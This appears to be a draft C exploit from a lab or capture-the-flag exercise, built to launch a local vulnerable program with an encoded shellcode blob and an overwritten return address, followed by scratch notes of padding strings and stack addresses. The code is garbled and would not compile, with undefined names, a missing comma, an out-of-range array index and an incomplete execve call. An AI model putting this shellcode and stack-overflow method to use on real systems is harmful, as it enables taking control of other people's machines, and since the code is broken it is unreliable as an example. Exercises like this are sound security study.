#include <stdio.h>

#define program "/home/kali/Documents/Alex/ch6/6notStripped"

char* retAddr="0xffffff"; // Return address for shellcode

char shellcode[] = "\xbe\x7f\x3b\xb5\x08\xdb\xd8\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x0b\x31\x73\x15\x83\xc3\x04\x03\x73\x11\xe2\x8a\x51\xbe\x50"
"\xed\xf4\xa6\x08\x20\x9a\xaf\x2e\x52\x73\xc3\xd8\xa2\xe3\x0c"
"\x7b\xcb\x9d\xdb\x98\x59\x8a\xd4\x5e\x5d\x4a\xca\x3c\x34\x24"
"\x3b\xb2\xae\xb8\x14\x67\xa7\x58\x57\x07"; // shellcode string

int main() {

     // Define the commandline parameters that VULN expects
     char* cmdParam[]={"A20","A21","A22","A23","A24","A25","A26","A27","\xAA"};

     // Define a null-terminated argv array for execve()
     char *challenge[] = 
         {program, SHELLCODE,cmdParam[1], cmdParam[2], cmdParam[3],cmdParam[4],cmdParam[5],cmdParam[6],cmdParam[7],cmdParam[8],cmdParam[9],RETURNaddress NULL};

     // Define a null-terminated envp array for execve()
     // This is where we place our shellcode, on the environment
     //char *exploit[] = {shellcode, NULL};

     // invoke execve(prog, progWithParameters, envp)
     execve(challenge[0], challenge);

     return 0;
}

AAAAAAAAAAAAAAAAAAAAAAAAAAAA \x84\x0d\xff\xff  

0xffffd050
AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x50\xd0\xff\xff

0xffffd020
\x20\xd0\xff\xff